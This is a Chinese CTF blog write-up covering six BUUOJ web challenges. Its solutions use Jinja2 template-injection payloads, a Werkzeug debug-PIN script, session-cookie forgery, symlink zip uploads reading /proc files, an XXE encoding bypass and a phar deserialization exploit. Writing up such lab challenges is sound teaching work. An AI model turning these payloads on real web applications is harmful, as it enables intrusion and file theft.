---
title: BUUOJ刷题记录(3)
date: 2020-09-23 
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170627.png
description: 
categories: 
- ctf_writeup
tags:
- RCE bypass
- flask
- XXE
- 伪随机数
- CVE
---
### [[FBCTF2019\]RCEService](https://buuoj.cn/challenges#[FBCTF2019]RCEService)

考点：%0a绕过正则匹配，绝对路径调用系统命令

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116015235.png)

要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给

比赛的时候应该是给了源码：

```
<?php
 
putenv('PATH=/home/rceservice/jail');
 
if (isset($_REQUEST['cmd'])) {
    $json = $_REQUEST['cmd'];
 
    if (!is_string($json)) {
        echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
        echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
    } else {
        echo 'Attempting to run command:&lt;br/&gt;';
        $cmd = json_decode($json, true)['cmd'];
        if ($cmd !== NULL) {
            system($cmd);
        } else {
            echo 'Invalid input';
        }
        echo '&lt;br/&gt;&lt;br/&gt;';
    }
}
 
?>
```

正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过

然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。

flag在PATH的上级目录。

```
?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}
```

 

 

 

### [[GYCTF2020\]FlaskApp](https://buuoj.cn/challenges#[GYCTF2020]FlaskApp)

考点：flaskSSTI、pin码

referer：https://blog.csdn.net/Alexhcf/article/details/108400293

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116014936.png)

#### 从base64解码发现SSTI

题目最开始给了两个页面，一个是base64加密、一个是base64解密

在base64解密的页面如果解密出现错误的话，会开启debug

而且在base64解密的页面发现了模板注入，传入`{{config}}`的base64编码会看到以下界面：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116014940.png)

那么我们可以沙箱逃逸试试，可以用jinja2中控制结构 `{% %}` ，也可以用变量取值 `{{}}`

如果用控制结构：

```
{% for c in [].__class__.__base__.__subclasses__() %} 
{% if 'catch_warnings' in c.__name__%} 
{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }} 
{% endif %}{% endfor %}
```

改成一行：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if 'catch_warnings' in c.__name__%}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
```

可以读取app.py的源码，当然也可读取根目录的flag

如果用变量取值：

```
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
```

可以列根目录文件（这个解法是非预期，预期是pin）

但是需要注意的是`{{''.__class__.__bases__[0].__subclasses__()}}`并不会有任何回显，需要`subclasses__()[xx]`慢慢找

预期解是算pin码然后用debug来RCE；

#### 读取6个参数计算pin码

任意文件读取的payload是：

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

其中filename是文件名称

 

通过PIN码生成机制可知，需要获取如下信息

- 服务器运行flask所登录的用户名。通过`/etc/passwd`中可以猜测为`flaskweb` 或者`root`，此处用的`flaskweb`
- modname。一般不变就是flask.app
- `getattr(app, “__name__”, app.__class__.__name__)`。python该值一般为Flask，该值一般不变
- flask库下app.py的绝对路径。报错信息会泄露该值。题中为`/usr/local/lib/python3.7/site-packages/flask/app.py`
- 当前网络的mac地址（十六进制）的十进制数。通过文件`/sys/class/net/eth0/address` 获取(eth0为网卡名)，我开的BUU的docker为`02:42:ae:01:2d:af` ，转换后为`2485410376060`
- 机器的id：对于非docker机每一个机器都会有自已唯一的id
  Linux：`/etc/machine-id`或`/proc/sys/kernel/random/boot_i`，有的系统没有这两个文件
  [Windows](https://www.cnblogs.com/HacTF/p/8160076.html)
  docker：`/proc/self/cgroup`



获取了6个值之后，可以利用exp计算pin码

```
import hashlib
from itertools import chain
 
probably_public_bits = [
    'flaskweb',  # 服务器运行flask所登录的用户名
    'flask.app',  # modname
    'Flask',  # getattr(app, "\_\_name__", app.\_\_class__.\_\_name__)
    '/usr/local/lib/python3.7/site-packages/flask/app.py',  # flask库下app.py的绝对路径
]
 
private_bits = [
    '2485410409903',  # 当前网络的mac地址的十进制数
    '0a1d70fa2590282a8abb5e96d8f175b147dd2477459d97c179af421feb9260cd'  # 机器的id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
```



运行得到131-679-327，在debug输入然后RCE

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116015910.png)

 



### [[MRCTF2020\]Ezaudit](https://buuoj.cn/challenges#[MRCTF2020]Ezaudit)

考点：PHP伪随机数，sql注入

要先扫目录，可以扫到login.php和www.zip，源码：

```
<?php
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
// 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }
 
    else{
        if($Private_key === '************'){
            $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';';
            $link=mysql_connect("localhost","root","root");
            mysql_select_db("test",$link);
            $result = mysql_query($getuser);
            while($row=mysql_fetch_assoc($result)){
                echo "&lt;tr&gt;&lt;td&gt;".$row["username"]."&lt;/td&gt;&lt;td&gt;".$row["flag"]."&lt;/td&gt;&lt;td&gt;";
            }
        }
    }
 
}
// genarate public_key
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i &lt; $length; $i++ )
$public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
return $public_key;
}
 
//genarate private_key
function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i &lt; $length; $i++ )
$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
return $private_key;
}
$Public_key = public_key();
//$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key???
```

其实就是两道题焊接起来，用GWCTF的exp可以直接打：

```
#!/usr/bin/env python
str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2='KVQP0LdJKRaV3n9D'
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print res
```

得到：

```
36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
```

拿去php_mt_seed跑，得到种子1775196155，然后去算私钥，注意要先把公钥算一遍再算私钥；

算出来之后sqli直接万能密码登录；

flag{a0b16377-22ae-4b81-b054-2afb7a5e6e6b

 

 

 

### [[SWPU2019\]Web3](https://buuoj.cn/challenges#[SWPU2019]Web3)

考点：flask session伪造、命令注入、CVE-2018-12015、`/proc/self/cwd`、`/proc/self/environ`

\>>[Linux下/proc/[pid\]/*的作用](https://www.hi-linux.com/posts/64295.html)

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020019.png)

输入用户名登录，页面会显示“Hello wh1sper”，尝试`{{}}`没有探测到注入。

登陆之后有个/upload路由，但是提示没有权限，估计是要进行cookie伪造

转而把注意力放在了cookie上面。

#### session伪造

利用flask-session-cookie-manager-master进行解码：

```
python .\flask_session_cookie_manager3.py decode -c ".eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ"
b'{"id":{" b":"MTAw"},"is_login":true,"password":"wh1sper","username":"wh1sper"}'
```

 

如果访问不存在的路由会给一个响应头：

```
Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== 
```

base64解码之后就是secret_key(这里没搞懂为什么要这样出):

```
SECRET_KEY:keyqqqwwweee!@#$%^&* 
```

再次进行解码：

```
python .\flask_session_cookie_manager3.py decode -c ".eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVCrPMCwuSC1S0lEqLU4tykvMTUUSrAUA2H4Z2g.X3vTHQ.Se1sFiI38_RUBhZeYgBMY2hoNaQ" -s "keyqqqwwweee!@#$%^&*"
{'id': b'100', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}
```

盲猜如果id=1的话应该就可以越权，那么再次加密回去；

```
python .\flask_session_cookie_manager3.py encode -s "keyqqqwwweee!@#$%^&*" -t "{'id': '1', 'is_login': True, 'password': 'wh1sper', 'username': 'wh1sper'}"
.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmXZxgWF6QWARWVFqcW5SXmpiIJ1gIA95wWug.X3vb0w.5S11T85EsOVa2ggJa_vbtgJDxr4
```

F12替换cookie，来到/upload路由；

 

ctrl+U能够查看到后端源码：

```
@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if session['id'] != b'1':
        return render_template_string(temp)
    if request.method == 'POST':
        m = hashlib.md5()
        name = session['password']
        name = name + 'qweqweqwe'
        name = name.encode(encoding='utf-8')
        m.update(name)
        md5_one = m.hexdigest()
        n = hashlib.md5()
        ip = request.remote_addr
        ip = ip.encode(encoding='utf-8')
        n.update(ip)
        md5_ip = n.hexdigest()
        f = request.files['file']
        basepath = os.path.dirname(os.path.realpath(__file__))
        path = basepath + '/upload/' + md5_ip + '/' + md5_one + '/' + session['username'] + "/"
        path_base = basepath + '/upload/' + md5_ip + '/'
        filename = f.filename
        pathname = path + filename
        if "zip" != filename.split('.')[-1]:
            return 'zip only allowed'
        if not os.path.exists(path_base):
            try:
                os.makedirs(path_base)
            except Exception as e:
                return 'error'
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except Exception as e:
                return 'error'
        if not os.path.exists(pathname):
            try:
                f.save(pathname)
            except Exception as e:
                return 'error'
        try:
            cmd = "unzip -n -d " + path + " " + pathname
            if cmd.find('|') != -1 or cmd.find(';') != -1:
                waf()
            return 'error'
            os.system(cmd)
        except Exception as e:
            return 'error'
        unzip_file = zipfile.ZipFile(pathname, 'r')
        unzip_filename = unzip_file.namelist()[0]
        if session['is_login'] != True:
            return 'not login'
        try:
            if unzip_filename.find('/') != -1:
                shutil.rmtree(path_base)
                os.mkdir(path_base)
                return 'error'
            image = open(path + unzip_filename, "rb").read()
            resp = make_response(image)
            resp.headers['Content-Type'] = 'image/png'
            return resp
        except Exception as e:
            shutil.rmtree(path_base)
            os.mkdir(path_base)
            return 'error'
    return render_template('upload.html')
 
 
@app.route('/showflag')
def showflag():
    if True == False:
        image = open(os.path.join('./flag/flag.jpg'), "rb").read()
        resp = make_response(image)
        resp.headers['Content-Type'] = 'image/png'
        return resp
    else:
        return "can't give you"
```

#### [利用软连接获取flag：CVE-2018-12015](https://www.anquanke.com/vul/id/1198331)



Perl是美国程序员拉里-沃尔（Larry Wall）所研发的一种免费且功能强大的跨平台编程语言。Archive：：Tar module是其中的一个用于处理tar文件的模块。 Perl 5.26.2及之前版本中的Archive：：Tar模块存在安全漏洞。攻击者可借助带有相同名称的符号链接和常规文件的归档文件利用该漏洞绕过目录遍历保护机制并覆盖任意文件。



以正常逻辑来看，源码的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。但是我们可以上传一个软链接压缩包，来读取其他敏感文件而不是我们上传的文件。同时结合 showflag()函数的源码，我们可以得知 flag.jpg 放在 flask 应用根目录的 flag 目录下。那么我们只要创建一个到`/xxx/flask/flag/flag.jpg`的软链接，即可读取 flag.jpg 文件。

在 linux 中，`/proc/self/cwd/`会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用`/proc/self/cwd/flag/flag.jpg`来访问 flag.jpg

命令：

```
ln -s /proc/self/cwd/flag/flag.jpg qwe
zip -ry qwe.zip qwe
```

repeater手动上传获得flag

另外一种方法是获取flask运行的绝对路径，在 linux 中，`/proc/self/environ`文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到`/proc/self/environ`的内容，只需要下载到本地，用 notepad++打开即可)

```
ln -s /proc/self/environ qqq
zip -ry qqq.zip qqq
ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www
zip -ry [www.zip](http://www.zip) www
```

#### 利用命令注入获取flag

另一种方法是通过命令注入来外带flag，我试了试本地是可以的

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020036.png)

VPS上面监听是可以收到的：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020459.png)

但是在BUU复现的时候，我开了内网靶机却没有外带成功，不知道是什么原因，那就不搞他了。

不得不说利用文件名进行命令注入的思路是很秒的

 

 

 

### [[CSAWQual 2019\]Web_Unagi](https://buuoj.cn/challenges#[CSAWQual%202019]Web_Unagi)

考点：XXE、编码绕过、外带数据



![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020246.png)

打开题目有一个上传界面，叫我们上传一个用户，并且here给了一个例子：

```
<?xml version='1.0'?>
<users>
    <user>
        <username>alice</username>
        <password>passwd1</password>
        <name>Alice</name>
        <email>alice@fakesite.com</email>  
        <group>CSAW2019</group>
    </user>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>  
        <group>CSAW2019</group>
    </user>
</users>
```

意思就是让我们上传一个XMl文件，由此我们想到了XXE漏洞。

但是我们在构造外部实体的时候，页面返回"WAF blocked uploaded file. Please try again"。可能是某些词语被waf了，既然有waf我们就要fuzz。

当我们在外部实体里面去掉`<!ENTITY dy SYSTEM "file:///flag">` 的时候，页面回显正常了，我们再来一个个测关键词。

一番fuzz之后，发现过滤了 `SYSTEM`、`file`、`ENTITY`等关键词。

常规的XXE绕过其中一种方法是利用除UTF-8的编码绕过。

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020259.png)

利用Linux的命令可以把文件转换为UTF-16的格式，此时我们上传发现没有出现WAF的信息。

只需要在标签里面引用实体就行了，但是我们发现flag只显示出来了一半。

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020402.png)

回显不出来就要外带数据，可以利用XML的报错信息，也可呀利用盲打的姿势外带。

我本来想外带VPS的，结过URL填错了直接一个报错出来了。。。

 

 

 

### [[CISCN2019 华北赛区 Day1 Web1\]Dropbox](https://buuoj.cn/challenges#[CISCN2019%20华北赛区520Day1520Web1]Dropbox)

考点：任意文件操作、phar反序列化

#### 任意文件下载

先是注册登录，然后发现有文件上传功能，上传之后只有一个下载和删除的按钮，联想到任意文件下载。

抓包，果不其然：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116020411.png)

挨个下载web路径文件，在class.php里面发现很多的类，联想到反序列化，然而并没有直接发现unserialize的操作。

结合文件上传，思路过渡到phar反序列化。

 

#### phar反序列化

根据phar反序列化的触发函数：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210116021051.png)

触发点在class.php124行的file_exists函数。

在download.php里面`ini_set("open_basedir", getcwd() . ":/etc:/tmp");`限制了目录，当你反序列化发生在这个页面的时候是不能读取根目录的，能触发但是读不了/flag.txt。

所以正确的触发点应该是delete.php的17行，调用$file->open，file_exists触发，delete.php里面并没有限制目录所以可以任意文件读。

 

#### POP链

User::__destruct:

```
public function __destruct() {
$this->db->close();
}
```

可以利用同名方法：

File::close：

```
public function close() {
  return file_get_contents($this->filename);
}
```

FileList::__call:

```
public function __call($func, $args) {
array_push($this->funcs, $func);
foreach ($this->files as $file) {
  $this->results[$file->name()][$func] = $file->$func();
}
```

 

 

exp:

```
<?php
class User {
    public $db;
}
 
class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
 
    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}
 
 
@unlink("phar.phar");
$phar = new Phar("a.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new User();
$o->db = new FileList();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

生成phar文件之后，抓包改MIME，在delete.php使用phar://文件名触发，读取flag。